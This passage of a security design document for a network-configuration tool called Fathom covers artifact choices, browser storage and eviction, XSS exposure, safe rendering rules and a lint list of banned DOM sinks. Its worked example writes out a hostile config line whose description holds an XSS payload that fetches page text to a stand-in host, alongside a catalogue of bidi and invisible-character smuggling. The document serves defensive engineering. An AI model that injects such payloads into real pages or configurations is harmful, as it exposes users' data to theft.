you cannot reliably store the result, you cannot isolate the parser, and you cannot report a
violation.

### 3.2 The three candidate shapes, evaluated

| | **(a) one HTML file, `file://`** | **(b) static bundle + one-line local server** | **(c) packaged desktop app** |
|---|---|---|---|
| Install friction | none. Email it, put it on a share, print the hash | run one binary | download and install a signed app per OS |
| Full CSP | no — four directives discarded (§2.8) | **yes** | yes, plus native controls |
| COOP/COEP/CORP/XFO/Permissions-Policy | no | **yes** | yes |
| `sandbox` (closes egress channels 1, 2) | no | **yes** | yes |
| Violation reporting | no | yes | yes |
| Workers | uncertain | yes | yes |
| OPFS / IndexedDB cache | uncertain to no | yes | yes, plus a real filesystem |
| Save without the download dialog | Chromium only, via File System Access | Chromium only, via File System Access | **yes, everywhere** |
| Extension exposure | full (`31` §6.2) | full | **none** — no extension surface |
| Supply chain | one artifact, one hash | same artifact plus the CLI binary, which we already ship | **three OS-specific signed artifacts, three notarisation paths, an updater** |
| Air-gapped acceptability | highest — an HTML file passes review where an executable does not | requires running a binary | requires installing software |
| Verifiable by a reviewer | trivially — read the file | read the file, read the server's source | hardest |

### 3.3 DECISION — two browser artifacts with different jobs, and the offline workspace is mode B

**The offline deliverable that holds a workspace is a static bundle served from loopback by
`fathom serve`, a subcommand of the CLI we already ship. The single HTML file continues to exist,
and it holds nothing.**

Concretely:

| Artifact | Contains | Does not contain | Policy |
|---|---|---|---|
| **`fathom-<version>.html`** — the reference artifact | The command finder (brief §6.1), the corpus, the explainers, the rule prose, the risk legend, the guidebook. All read-only reference content | **No workspace, no passphrase entry, no envelope code, no ciphertext, no storage** | mode A |
| **`fathom-<version>-offline.tar.zst`** + `fathom serve` — the offline workspace artifact | Everything. Walkthroughs, graph, emitters, findings, suppressions, diagram, the full crypto path | Sync (there is no server to sync to) | mode B |
| **`fathom` CLI** | The same Rust core, native. Emit, lint, diff, verify, pack, unpack, fsck, serve | A browser | *n/a* |

The rule that generates this split, and the sentence to quote in a review:

> **We do not put a secret behind a policy we cannot deliver.**

Mode A cannot deliver `frame-ancestors`, `sandbox`, COOP, COEP, CORP, `X-Frame-Options`,
`Permissions-Policy`, `Integrity-Policy` or violation reporting; its storage is unreliable; its
worker support is unverified. Every one of those is load-bearing for an artifact holding a decrypted
network estate. None of them is load-bearing for an artifact holding a signed, public, read-only
corpus that anyone can download from the release page anyway.

**This is not a demotion of the single file. It is the brief's own argument, made structural.**
Owner brief §6.1 on the command finder:

> *"zero setup, zero data entry, zero trust required, because it is read-only reference content
> needing none of the crypto, none of the server, none of the graph."*

The wedge feature is exactly the feature that does not need the policy. So the artifact that cannot
carry the policy carries exactly the wedge feature. The alignment is not a coincidence — it is what
happens when the security boundary is drawn along the same line as the trust requirement.

### 3.4 The cost, stated

Four costs. The first is the one that will be argued with.

1. **"Open one file and model your estate offline" is no longer true.** It is now "open one file and
   look things up offline; run one command to model your estate offline." For a network engineer on
   a jump host with no ability to run an unsigned binary, that is a capability loss, and there is no
   version of this decision where it is not.
2. **Air-gapped and high-assurance environments are exactly where an HTML file passes change control
   and an executable does not.** These are also, per brief §2.4, the market SaaS competitors
   structurally cannot serve — so this cost lands on the segment the product is most differentiated
   for. This is the strongest argument against the decision and it is not answered by anything below.
3. **A second thing to explain.** Two artifacts means two download links, two hashes, two sets of
   instructions, and a question in every evaluation about why there are two.
4. **The reference artifact will be mistaken for the product.** Someone will open
   `fathom-3.1.4.html`, find no way to create a workspace, and conclude the tool does not work. The
   mitigation is in the artifact itself: a permanent masthead line, in the field card's register —
   `reference only · no workspace here · fathom serve for the full tool` — and the same sentence in
   the release notes.

**What makes the trade worth taking anyway:** the alternative is an artifact that accepts a
passphrase, decrypts a network estate, and then cannot state a policy about what happens to it. That
artifact would have to be described accurately in the limits panel, and the accurate description is
*"this build has no clickjacking control, no egress control over navigation, no violation reporting,
and storage that may or may not exist."* Shipping it and describing it accurately is worse than not
shipping it. Shipping it and describing it inaccurately is the thing the conventions exist to
prevent.

### 3.5 Why not a packaged desktop app — and the trigger that changes the answer

Rejected for now, on cost rather than on merit. Option (c) is genuinely the strongest security
position in the table: no extension surface at all (`31` §6.2's most underrated actor disappears), a
real filesystem instead of the download fallback (`32` §13.1's "genuinely poor" outcome), and native
policy controls.

What it costs: three OS-specific signed artifacts, Apple notarisation, Windows code signing, an
update channel that becomes an attack surface (`31` §5.1 row 18), a webview whose version we do not
control, and a per-OS supply chain for a project whose entire security argument rests on one
reproducible build being checkable by a stranger.

**The trigger to revisit:** when the download-fallback save path (`32` §13.1) is measurably losing
users' work, or when a customer's requirement is specifically "no browser extensions in the same
process as our configurations". Either of those makes (c) the right answer, and the Rust core
already compiles native, so the port is the shell and not the product.

**Note what is already true:** `fathom serve` gives mode B most of (c)'s policy benefits at none of
(c)'s supply-chain cost, because the binary that serves it is the CLI we ship anyway. That is the
whole reason the decision lands where it does.

### 3.6 `fathom serve`, concretely

It is a static file server with four rules and no API. It exists to produce response headers, and
saying that out loud keeps it from growing features.

```
fathom serve [--port 7440] [--bind 127.0.0.1] [--open]

  Serves the offline bundle. No workspace passes through this process.
  No API. No upload. No proxy. No TLS (loopback is a secure context already).
```

| Rule | Why |
|---|---|
| **Binds `127.0.0.1` and `[::1]` only.** `--bind` accepts no other value; a non-loopback address is a startup error, not a warning | A network engineer's laptop is on networks that are not theirs. A `0.0.0.0` default would serve the bundle to the coffee shop |
| **Validates the `Host` header** against `127.0.0.1:<port>` and `[::1]:<port>`; anything else is a 421 | DNS rebinding. A remote page can resolve a name it controls to `127.0.0.1` and issue requests. Nothing here is worth reading, but the check is four lines and it removes the question from the review |
| **Serves only from a manifest of built files**, path-matched exactly, generated at build time and embedded in the binary. No directory traversal to defend against, because there is no filesystem lookup | Path traversal is the classic static-server bug and this design does not have a path to traverse |
| **Emits no CORS headers at all**, and `Cross-Origin-Resource-Policy: same-origin` | Another local origin cannot read our assets or our storage |

**The port is fixed by default, and that is a deliberate trade.** Browser storage is keyed by origin,
and the origin includes the port. A random port per run means a fresh origin per run, which means the
OPFS cache is never reused and the offline build cold-starts every session. A fixed port means a
stable origin — and it means any other process on the machine can bind `127.0.0.1:7440` after we
exit and inherit our origin, including our OPFS.

We take the fixed port, because `32` §13.1 already decided that **the workspace on disk is the store
and browser storage is a cache**. An origin squatter inherits a cache of ciphertext, which is the
same ciphertext they could have read off the disk. If that decision were ever reversed — if OPFS
became the primary store — the port decision would have to be reversed with it, and §11 records that
coupling.

### 3.7 What mode A is still for, and the line that keeps it honest

The reference artifact is not a consolation prize. It is the on-ramp the brief describes: the thing
someone opens ten times a day, from a share, from a USB stick, from an email, with no install and no
account. It is also the artifact that is trivially verifiable — one file, one hash, one inline script
whose SHA-256 is in the policy that governs it (§2.5).

The line in its masthead, in the field card's margin-tab register, lowercase and unpunctuated:

```
  FATHOM · REFERENCE                              reference only · fathom serve for workspaces
```

And, once, in the imperative register the card uses for its governing rule:

```
  THIS BUILD HOLDS NO WORKSPACE AND ASKS FOR NO PASSPHRASE. IF SOMETHING HERE ASKS FOR ONE,
  IT IS NOT THIS BUILD.
```

That second line is a control, not copy. The most plausible phishing attack against this product is
a `fathom.html` that looks like ours and asks for a passphrase. Stating in the real artifact that the
real artifact never asks makes the fake one contradict a sentence the user has read before.

---

## 4. Storage

### 4.1 The candidates

| Store | Async | Capacity | Evictable | Under `file://` | Verdict for Fathom |
|---|---|---|---|---|---|
| **The workspace on disk** (`.fathom` / `.fathom.d`) | via File System Access or download | filesystem | **no** | works | **Primary. `32` §13.1** |
| **OPFS** | yes, with sync access handles in a worker | origin quota | yes, silently, under pressure | uncertain | **Cache only** |
| **IndexedDB** | yes | origin quota | yes | blocked | Cache only, and only where OPFS is unavailable |
| **Cache API** | yes | origin quota | yes | uncertain | The app shell in modes B–D. Never workspace data |
| **`localStorage`** | no — synchronous, main-thread, string-only | a few MB | yes | varies | **Never.** Nothing. Not a preference, not a flag |
| **`sessionStorage`** | no | small | on tab close | varies | Never |
| **Cookies** | n/a | tiny | yes | n/a | None. There are none, in any mode, including mode C's sync auth — which uses a header, not an ambient cookie (`31` §5.1 row 16) |

The decision was made in `32` §13.1 and is not reopened here: **the file is the store; browser
storage is a cache that makes reopening fast and survives a tab crash; it is never the only copy.**
This section specifies what that means operationally, because "it's just a cache" is the kind of
statement that stops being true one convenient feature at a time.

### 4.2 Eviction — the browser can delete your work

Storage in a browser is best-effort by default. The user agent may clear it when the device is under
storage pressure, and it does not have to ask. Marking a bucket persistent requires the
`persistent-storage` permission via `navigator.storage.persist()`, which browsers grant on their own
heuristics rather than on request, and which the user can revoke by clearing site data at any time.

<!-- VERIFY: current grant heuristics for navigator.storage.persist() per browser (Chromium's
engagement/installed-PWA signals, Firefox's prompt, WebKit's position), current per-origin quota
formulas, and whether the Storage Buckets API (persistence: 'persistent', durability: 'strict') is
available in the target matrix. All three move, and the checklist item H21 depends on them. -->

There is a second eviction mechanism that is more dangerous for this product than quota pressure:
**time-based clearing of script-writable storage for sites the user has not interacted with
recently.** A tool a network engineer opens during a change window and then not again for six weeks
is exactly the profile that trips it.
<!-- VERIFY: which browsers currently apply a time-based cap to script-writable storage, the exact
period, and whether it applies to a loopback origin. If it does apply to 127.0.0.1, the OPFS cache in
mode B is even more clearly a cache and §4.3's boot path is even more clearly mandatory. -->

**What we do about it, in order:**

| # | Action | Detail |
|---|---|---|
| 1 | **The cache is never the only copy** | Structural, from `32` §13.1. Everything below is about making the consequence of eviction "slower" rather than "gone" |
| 2 | **Request persistence, once, and do not depend on it** | Call `navigator.storage.persist()` after the first successful save, record the result, and show it in the limits panel as a fact — `storage: best-effort` or `storage: persistent` — not as a setting the user can toggle, because they cannot |
| 3 | **Watch the quota, and say something before the browser does** | `navigator.storage.estimate()` on open and after each save. Above 80 % of the reported quota, a muted line: `this origin is near its storage quota — the cache may be dropped. Your workspace on disk is unaffected.` The estimate is deliberately imprecise in some browsers, so it is a warning threshold and never an arithmetic claim <!-- VERIFY: which browsers pad or bucket the values returned by StorageManager.estimate(), and by how much. --> |
| 4 | **Detect eviction rather than crash into it** | §4.3 |
| 5 | **Never write plaintext to any store, ever, under any circumstance** | §4.7. This is what makes eviction an availability event and not a confidentiality one |

**Rule 5 is what makes rules 1–4 tolerable.** If the cache were plaintext, eviction would be the
*good* outcome and non-eviction would be the problem. Because the cache is envelope bytes, an evicted
cache costs the user a re-open and nothing else, and a non-evicted cache is one more copy of
ciphertext on a disk that already has one.

### 4.3 The boot path, written for the eviction case

The failure to avoid is the one `32` §4.4 names for a different reason: a user believing their data
is gone. An evicted cache must never surface as "workspace not found", and never as a decryption
error.

```
open()
  ├─ 1. Is there a retained FileSystemFileHandle for the last workspace?
  │      └─ yes → verify permission (may need a user gesture to re-grant)
  │                 └─ granted   → read the workspace from disk. Authoritative.
  │                 └─ refused   → state 3 below, with the path shown
  │      └─ no  → state 3
  ├─ 2. Is there a cache in OPFS for that workspace id?
  │      └─ yes → compare manifest_hash + version vector against the disk copy
  │                 └─ equal     → open from cache (fast path)
  │                 └─ cache older → open from disk, rebuild cache
  │                 └─ cache NEWER → refuse and ask. This is the crash-recovery case
  │                                  and it is also what a rollback looks like (32 §8)
  │      └─ no  → open from disk, rebuild cache, and say nothing — this is normal
  └─ 3. No handle, no cache:
         "Open your workspace file."   ← not an error. Not a dialog. The normal empty state.
```

The one message that is allowed to be alarming is the `cache NEWER` branch, because that is either a
crash with unsaved work — recoverable, and the user wants it — or the rollback condition `32` §8.2
specifies. Both need a typed confirmation naming both versions and their dates, not a button.

### 4.4 Origin isolation — what it buys and what it does not

| Buys | Does not buy |
|---|---|
| Another origin's page cannot read our OPFS, IndexedDB or Cache API entries | Anything against same-origin script (§4.5) |
| Another origin cannot read our assets, with `Cross-Origin-Resource-Policy: same-origin` | Anything against an extension (`31` §6.2) |
| We are never a third party, because `frame-ancestors 'none'` means we are never framed — so storage partitioning never applies to us and none of its edge cases are ours to reason about | Anything against DevTools, a heap snapshot, or the OS |
| In mode B, another *local* application cannot read the cache while we hold the port | It does not survive us releasing the port (§3.6) |

The third row is a small, real benefit of a decision made for another reason. Applications that can
be embedded inherit an entire category of partitioned-storage behaviour that changes between browser
versions. We opted out of that category in §9.2 and get this for free.

### 4.5 What a same-origin XSS actually gets you

Written as stages, because the answer depends entirely on what is unlocked at the moment the payload
runs, and a single "total compromise" verdict hides the one thing that is actually under our control.

| Stage | Workspace state | What the payload reaches | Bounded by |
|---|---|---|---|
| **S0** | Any | The DOM: every rendered config line, finding, peer address, suppression reason. The passphrase input's `value`. The whole WASM linear memory as a `Uint8Array` | nothing |
| **S1** | Locked, never opened this session | Ciphertext in the OPFS cache; the envelope headers, which are in the clear by design (`32` §7.1). No keys | the KDF and the passphrase's entropy — i.e. `32` §4.6's table, offline |
| **S2** | Locked after having been open (`lock()` ran) | S1, plus whatever survived zeroing: JS strings the language will not let us erase, GC-unreached copies, anything the OS paged out (`32` §14.3) | nothing we control. `31` §5.1 row 14 |
| **S3** | Unlocked | The entire decrypted graph, the root key, every derived key, and the ability to call `seal`/`open` at will | nothing |
| **S4** | Any | Persistence: rewrite the cache, install a payload that re-runs on next open, alter what the user sees so a `Disruptive` line reads as `ReadOnly` | signature checking on the artifact, which an in-origin payload can also rewrite |

**S4 deserves more attention than it usually gets in an XSS write-up.** For most applications the
prize is data. For Fathom, an equally valuable prize is *changing what the engineer believes*. A
payload that leaves the graph alone and edits one rendered line — turning `10 × 3` into `10 × 30`, or
removing `perfect-forward-secrecy keys group14` from a copied block — produces a bad change in a
production network with the tool's authority behind it. `31` §8.2's goal B is the tree for this and
it is the reason the emit path carries provenance all the way to the clipboard (§6.3).

**The step that is actually under our control is S1 → S3.** Everything else is platform. Which is
what §4.6 is about.

### 4.6 Per-record keys held transiently — what they are worth

`32` §3.2 derives a key per record rather than encrypting the workspace under one key. §6.2 there
shards records so that one changed field touches one file. Both decisions were made for other
reasons — git behaviour, rotation cost, metadata. They have a browser-hardening consequence worth
stating precisely, and worth not overstating.

**The property:** if the application opens only the records it needs, and drops the derived key and
the plaintext when the view closes, then at any instant the decrypted footprint is the working set
and not the estate.

**What that is worth:**

| Against | Worth |
|---|---|
| A renderer crash dump, a tab-discard snapshot, a session-restore snapshot, an OS page-out — the passive artifacts of `31` §5.1 row 14 | **Real.** These capture memory at an instant. A snapshot taken while the engineer is looking at one SRX contains one SRX, not forty-seven |
| A devtools heap snapshot taken by someone who has the laptop | Real, same reason |
| **Live code execution in the origin (S3)** | **Nothing.** The root key is resident for the whole unlocked session — it has to be, or no record could be opened — so a payload derives whatever it wants. Anyone who describes this as a defence against XSS is wrong |

**The honest formulation:** per-record keys shrink the *instantaneous* plaintext footprint, which
matters against artifacts nobody chose to create. They do not compartmentalise against an attacker
with execution, and `32` §19 C14 already records that there is no in-workspace compartmentation at
all.

**The implementation rule that makes the property true rather than notional:**

```rust
/// A record's plaintext and its derived key are bound to one scope and die together.
/// Not a cache. Not an LRU. Closing the view drops both.
pub struct OpenRecord {
    id: RecordId,
    key: Zeroizing<[u8; 32]>,        // derived on open, zeroed on drop
    plain: Zeroizing<Vec<u8>>,       // capacity reserved up front (32 §14.2)
}

impl Drop for OpenRecord { /* zeroize runs; see 32 §14.1 */ }
```

The temptation an implementer will feel is to cache opened records for speed, because re-deriving is
an HKDF call and re-opening is an AEAD open, and both are cheap enough that a cache looks free. It is
free in CPU and it costs the entire property above. **DECISION — no open-record cache. Records are
opened on view and dropped on close.** If a profile later shows this is a real cost, the answer is a
bounded, explicitly-sized working set with a stated maximum, not an LRU that grows to the estate.

### 4.7 Storage hygiene rules

| # | Rule | Test |
|---|---|---|
| **ST1** | No plaintext derived from a workspace is written to any browser store, ever | §10 H19: canary scan across OPFS, IndexedDB, `localStorage`, `sessionStorage`, Cache API after a full session |
| **ST2** | No key material is written to any store, including "just the wrapped one" | Same scan, with a key canary |
| **ST3** | `localStorage` and `sessionStorage` are not used at all | §10 H20: the strings do not appear in the bundle |
| **ST4** | Settings that are not sensitive still live in the workspace ciphertext, not in a store (`17` §10.1) | Same scan |
| **ST5** | The UI's own state — scroll position, panel widths, depth toggle — may live in `sessionStorage`… **no.** It lives in the workspace too. There is no second store | ST3 subsumes it |
| **ST6** | Sign-out in modes C–D sends `Clear-Site-Data: "cache", "storage"` and the client also deletes the OPFS tree explicitly, because the header's coverage varies | §10 H22 |
| **ST7** | Nothing is written to a store before the workspace is unlocked | An automated run that opens the app and never unlocks must leave the origin's storage empty |
| **ST8** | The cache is keyed by workspace id and manifest hash, so a stale cache is detectable rather than silently wrong | §4.3's boot path, tested with a hand-rolled stale cache |

ST5 is written the way it is on purpose. Every application of this shape acquires a second store for
"harmless" UI state, and then something not harmless ends up in it. One store, and it is encrypted.

---

## 5. XSS in an application whose job is rendering untrusted text

### 5.1 The sources of untrusted text

This is the part of Fathom that is unusual. Most applications render a little untrusted text at the
edges. Fathom's core loop is *paste a configuration written by someone else and render it back
annotated* (brief §6.3). The untrusted text is not at the edge; it is the subject.

| # | Source | Controlled by | Reaches | Trust |
|---|---|---|---|---|
| U1 | A pasted device configuration | **whoever wrote that config** — `31` B12, the only fully attacker-controlled boundary by design | parsers, then the graph, then every view | none |
| U2 | Node field values parsed from U1 — device names, zone names, policy names, `description` strings, `dynamic hostname`, identities | same as U1 | every view, the diagram, the finder's interpolated results, emitted config | none |
| U3 | User-typed values — names, descriptions, suppression reasons, export reasons | the user, who is not attacking themselves but may paste something | same as U2, and additionally the export header (`17` §15.5) | none, treated as U2 |
| U4 | Corpus prose and command entries | us, human-authored with `reviewed_by` (invariant 10), signed | explainer panels, the finder, the guidebook | high, **not absolute** — `31` A7 |
| U5 | Rule pack prose: `title`, `why`, `symptom_if_mismatched`, `remediation`, `acceptable_when`, `sources` | a third-party publisher whose key we trust (`12` §13). Signing bounds who, never what | findings, remediation blocks, the suppression flow | low |
| U6 | AI-layer output at tiers 1–3 | non-deterministic, quarantined behind the AI boundary (invariant 9) | the `note` surface only, never an emit path | none — `23` treats it as hostile |
| U7 | Filenames, from a file picker or a drop | the filesystem | the title bar, the export log | none |
| U8 | Parser error text that echoes the offending input | U1, transitively | the error surface | none |
| U9 | Clipboard `paste` events carrying `text/html` | any application on the machine | the paste handler | none — §6.6 |

**U8 is the one that gets forgotten.** A parser that reports `unexpected token "…" at line 41` and
renders that message through a different path from the one the config text goes through is a second
renderer, written in a hurry, that nobody reviewed. Rule: parser errors are structured values
(`{ code, line, column, excerpt }`) and the excerpt renders through the same path as any other config
text (§5.5).

### 5.2 The rendering rules

Hard rules. Numbered so a code review can cite one.

| # | Rule |
|---|---|
| **R1** | **No `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `document.writeln`, `Range.createContextualFragment`, or `DOMParser.parseFromString` on anything, anywhere.** Not "not on untrusted content" — not at all. A codebase with one legitimate use has a hundred plausible ones |
| **R2** | Text reaches the DOM through `textContent` or `document.createTextNode`, and through nothing else |
| **R3** | Elements are created with `document.createElement` / `createElementNS` from a closed set of tag names that is a literal union type in TypeScript. No tag name is ever computed from data |
| **R4** | Attributes are set with `setAttribute` from a per-element allowlist of attribute names, also a literal union type. **No attribute name is ever computed from data.** This closes the `on*` handler class structurally rather than by denylist |
| **R5** | **No URL from any untrusted source becomes an `href`, `src`, `srcset`, `action`, `formaction`, `data`, `poster`, `xlink:href` or CSS `url()` value.** Not after validation, not after scheme-checking. There is no allowlist, because there is no case where we need one (§9.4) |
| **R6** | No CSS derived from content. No `style` attribute assembled from data. No `cssText`. Colour comes from the three-value `Risk` enum and the neutral palette, both closed sets, both class names from a literal union |
| **R7** | `class` and `id` values never contain a content-derived substring |
| **R8** | Config text, command text and device output render inside a mono block with `white-space: pre`, as a single text node per line, with nothing interpreted |
| **R9** | Any identifier used as a `data-` value is validated against its shape before use — node IDs match `fathom:[a-z-]+:[0-9A-HJKMNP-TV-Z]{26}` (Crockford base32 ULID, per the conventions), rule IDs match `[a-z0-9]+(\.[a-z0-9-]+)+` |
| **R10** | **The renderer never receives a string it did not construct.** Content arrives as typed values — an AST node, a `(line, provenance)` pair, a `Finding` — and the renderer walks the type. There is no `render(html: string)` in the codebase and no function whose name ends in `Html` |

R10 is the rule the other nine are consequences of. State it first in the style guide.

The type that makes R2 and R10 checkable:

```ts
// Anything that came from outside the build is this type, and this type has one sink.
declare const BRAND: unique symbol;
export type Untrusted = string & { readonly [BRAND]: 'untrusted' };

export const untrusted = (s: string): Untrusted => s as Untrusted;

/** The only function in the codebase that writes text into the document. */
export function text(parent: Element, value: Untrusted | string): void {
  parent.appendChild(document.createTextNode(value));
}
```

Every value crossing the WASM boundary from graph, corpus, pack or parser is typed `Untrusted` by
the binding layer. A developer who wants to concatenate it into anything has to launder it
deliberately, and the lint (§5.8) bans the laundering call outside two files.

### 5.3 Rendering the corpus — an AST allowlist, not a sanitiser

The single most valuable decision already made here is `15` §6.4's: **the corpus markdown subset is
compiled to an AST at build time; the client ships the AST; no markdown parser runs on the client.**

That removes the entire class. There is no sanitiser, because there is no HTML. There is no markdown
parser on the client, so there is no markdown parser bug on the client, no reference-link edge case,
no HTML-block passthrough, no autolink scheme confusion. The client's job is to walk a typed tree.

```ts
export type Depth = 'terse' | 'explained' | 'teaching';   // brief §5.4

export type CorpusBlock =
  | { k: 'para';  kids: Inline[] }
  | { k: 'list';  items: Inline[][] }                      // ≤ 5 items, no nesting (15 §6.4)
  | { k: 'quote'; kids: Inline[] }                         // quoting device output
  | { k: 'cmd';   id: CommandId; risk: Risk }              // renders with the risk legend chip
  | { k: 'block'; lines: string[]; lang: BlockLang };

export type Inline =
  | { k: 'text'; v: Untrusted }
  | { k: 'code'; v: Untrusted }                            // the card's mono-in-prose texture
  | { k: 'em';   v: Untrusted }
  | { k: 'slot'; v: Untrusted };                           // resolved interpolation (15 §6.5)

export type BlockLang = 'junos-set' | 'output' | 'plain';
```

```ts
function renderBlock(parent: Element, b: CorpusBlock): void {
  switch (b.k) {
    case 'para':  return renderInlines(el(parent, 'p'), b.kids);
    case 'list':  { const ul = el(parent, 'ul');
                    for (const it of b.items) renderInlines(el(ul, 'li'), it);
                    return; }
    case 'quote': return renderInlines(el(parent, 'blockquote'), b.kids);
    case 'cmd':   return renderCommand(parent, b.id, b.risk);
    case 'block': return renderMonoBlock(parent, b.lines, b.lang);
    // no default: adding a block kind without a renderer is a compile error
  }
}
```

The missing `default` is the control. `tsc` with exhaustiveness checking turns "someone added a node
kind and forgot the renderer" from a runtime hole into a build failure.

**Three rules that keep the AST honest:**

1. **The build-time compiler validates the AST against the same union**, so a corpus entry that
   somehow produced an unknown node kind fails the corpus build, not the client.
2. **The AST carries no URLs.** `15` §6.4 already forbids inline `[x](y)` links, and `links:` entries
   are a separate typed structure the graph gates can count. §9.4 decides what the renderer does with
   them, which is: renders them as text.
3. **Rule-pack prose (U5) uses the same pipeline**, compiled when the pack is built, validated
   against the same union at install. A pack whose prose contains a node kind we do not render is
   rejected at install with a named error — not rendered partially.

### 5.4 Rendering config, commands and device output

This is R8, expanded, because it is the highest-volume rendering path in the product and the field
card is explicit about how it should look.

The card's own texture, which the tool must reproduce:

```
set security ike proposal IKE-P1 \
  authentication-method pre-shared-keys
set security ike proposal IKE-P1 dh-group group14
```

| Requirement | From | Implementation |
|---|---|---|
| Continuation backslashes preserved; commands wrap the way a terminal wraps, not the way a webpage wraps | design language, *Devices worth stealing* #5 | The `\` and the newline are content. One text node per line. `white-space: pre`. No soft wrapping inside a command |
| Mono block on the surface wash `#F2F4F6` | design language, palette | A class from a closed set (R6) |
| Risk legend on anything copyable | brief §5.3, invariant | `Risk` enum, three values, from the `(line, provenance)` pair — never inferred by the renderer |
| Provenance available per line | invariant 6 | `data-node` carries the node ID, validated by R9. Clicking a line opens the explainer, which is the architecture's teaching property (brief §4.1) |

```ts
function renderEmitted(parent: Element, lines: readonly EmittedLine[]): void {
  const pre = el(parent, 'pre', { class: 'mono-block' });
  for (const line of lines) {
    const row = el(pre, 'span', { class: `line risk-${line.risk}` });
    row.setAttribute('data-node', assertNodeId(line.sourceNode));   // R9
    text(row, line.text);                                            // R2 — the only sink
    text(pre, '\n');
  }
}
```

**Note what is absent: escaping.** There is no `escapeHtml` in this codebase and there must not be
one. A config line containing `</pre>`, `<script>`, `"` or `&` is rendered by `createTextNode`
exactly as written, because the DOM never parses it. **The escaping question disappears when you
never concatenate markup, and every escaping bug is a bug in a function that should not exist.** An
`escapeHtml` function appearing in a diff is a signal that someone has started building strings, and
§5.8's lint treats its existence as a failure.

### 5.5 Invisible characters, bidi, and homoglyphs

A configuration is text a human reads and then pastes into a device. Anything that makes the rendered
text differ from the bytes is an attack on the human, and no amount of DOM safety touches it.

| Class | Example | Effect |
|---|---|---|
| Bidi controls | `U+202A`–`U+202E`, `U+2066`–`U+2069` | Reorders rendered text so a line reads as something other than what it is. The "Trojan Source" class |
| Zero-width | `U+200B`–`U+200D`, `U+FEFF` | Hides a difference between two identifiers that look identical |
| Tag characters | `U+E0000`–`U+E007F` | Encodes an arbitrary ASCII payload that most renderers draw as nothing. `23` §12 records this as the ASCII-smuggling channel |
| Homoglyphs | Cyrillic `е` in `perfect-forward-secrecy` | A rule condition does not match; the engineer sees a line that looks correct |
| Control characters | `U+0000`–`U+0008`, `U+000B`, `U+000C`, `U+000E`–`U+001F`, `U+007F` | Terminal effects on paste |

**The rule, and the reason it is not "strip them":**

> **Never silently alter text the user will paste into a device.** Stripping a character changes what
> the tool shows from what the tool was given, and the user's next action is to paste it into a
> production box.

So, three different behaviours for three different paths:

| Path | Behaviour |
|---|---|
| **Displaying a raw capture** (`17` §4.5) | Render the bytes, with every character from the classes above replaced by a **visible sentinel badge** carrying its codepoint — `⟨U+202E⟩` — in the muted `#5C6772`, and a `4px` accent bar above the block naming the count. The original bytes are untouched in the workspace |
| **Ingesting a capture into the graph** (U1 → U2) | Normalise: strip the invisible classes, NFC-normalise, record the normalisation in the node's provenance with the original offsets. The graph holds the cleaned value; the capture holds the original. This is what provenance is for |
| **Emitting config** | Cannot arise. Emitted lines are built from graph values by the emitter (invariant 6), and §6.3 C6's CI check asserts every emitted byte is in `[\x20-\x7E\n]`. A device name that survived normalisation and still contains a non-ASCII character fails emit with a named error, not a silent mangle |

The middle row is where the honest cost sits: a config whose object names genuinely contain non-ASCII
characters will be normalised, and the emitted config will differ from the source. That is correct
behaviour for a tool whose output is pasted into a CLI, and it must be *visible* — a finding, not a
silent fix.

### 5.6 SVG and the diagram

The diagram (brief §6.5) is the one surface that produces a document format rather than DOM, and SVG
is a markup language with script sinks in it.

| Rule | Detail |
|---|---|
| Built with `createElementNS('http://www.w3.org/2000/svg', …)` from a closed tag set: `svg g path rect line circle text tspan title` | R3, in the SVG namespace |
| **No `<foreignObject>`.** Ever | It is an HTML injection point inside SVG and it exists for exactly the reason we do not need it |
| **No `<script>`, no `<style>`, no `<image>`, no `<use>`, no `<a>`, no `<animate*>`** | Every one is either a script sink, a fetch, or a navigation |
| Labels are `<text>` with a text-node child | R2 |
| No `xlink:href` and no `href` on any element | R5 |
| Presentation attributes only, from the closed palette; no `style` attribute | R6 |
| **Export re-serialises from the same builder**, it does not `outerHTML` the live tree | An exported `.svg` is a file that will be opened in a browser later, possibly by someone else, possibly from a share. It inherits none of our headers. Treat it as hostile output we are responsible for |
| The export carries the plaintext header block from `17` §15.5 as an SVG `<title>` and a `<text>` banner | A diagram of a network estate is a plaintext export and `17` §15.3's gate applies |

### 5.7 The sink list, and the lint that bans it

Rules are documentation until something fails a build. The banned list, verbatim, as the lint config:

| Banned | Where allowed |
|---|---|
| `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `document.writeln` | nowhere |
| `DOMParser`, `Range.createContextualFragment`, `Element.setHTML` | nowhere |
| `eval`, `new Function`, `setTimeout`/`setInterval` with a non-function first argument | nowhere |
| `element.style.cssText`, `CSSStyleSheet.insertRule`, `<style>` construction | nowhere |
| `setAttribute` with a non-literal first argument | nowhere |
| `location =`, `location.href =`, `location.assign`, `location.replace`, `window.open` | nowhere (§9.5) |
| `window.addEventListener('message', …)` | nowhere (§9.5) |
| `localStorage`, `sessionStorage`, `document.cookie` | nowhere (§4.7 ST3) |
| `escapeHtml` and any function whose name matches `/(sanitiz|escape).*(html|markup)/i` | nowhere — §5.4 |
| `untrusted()` — the laundering constructor | `src/boundary/wasm.ts`, `src/boundary/corpus.ts` only |
| `trustedTypes.createPolicy` | `src/boundary/tt.ts` only |
| `new Worker`, `importScripts` | `src/workers/spawn.ts` only |

Two layers, because either alone is insufficient:

1. **Static:** the list above as lint rules, on `--max-warnings 0`, plus a grep over the *built*
   bundle for the same strings, because a lint rule only sees source we told it about.
2. **Runtime:** `require-trusted-types-for 'script'` (§2.9) catches anything both layers missed, in
   the browsers that implement it — which is why the static layer is not optional (§2.9 cost 4).

### 5.8 A worked example, from the field card

The most common thing this product will do: someone pastes side 1's Phase 1 block and asks what it
means. Trace one hostile variant of it through the rules.

Input (U1), with an injected `description` and a bidi control, both plausible in a real capture:

```
set security ike gateway GW-B address 203.0.113.10
set security ike gateway GW-B external-interface reth0.0
set security ike gateway GW-B description "<img src=x onerror=fetch('https://a.test/?d='+document.body.innerText)>"
set security ike policy IKE-POL description "peer‮ gnitset-ton"
```

| Stage | What happens |
|---|---|
| Parse (worker, §7.3) | Safe Rust. The `description` value is a string; nothing evaluates it. The parser is a parser |
| Ingest | The bidi control `U+202E` in the second description is stripped, NFC applied, and a provenance record notes the normalisation with the original offset. A finding is raised: the value contained a bidi control |
| Graph | `IkeGateway.description` holds the literal text, `<img …>` and all. It is data |
| Render, `Explained` depth | `text(row, node.description)` → `createTextNode`. The panel displays the literal characters `<img src=x onerror=…>` in mono. No element is created. No request is made |
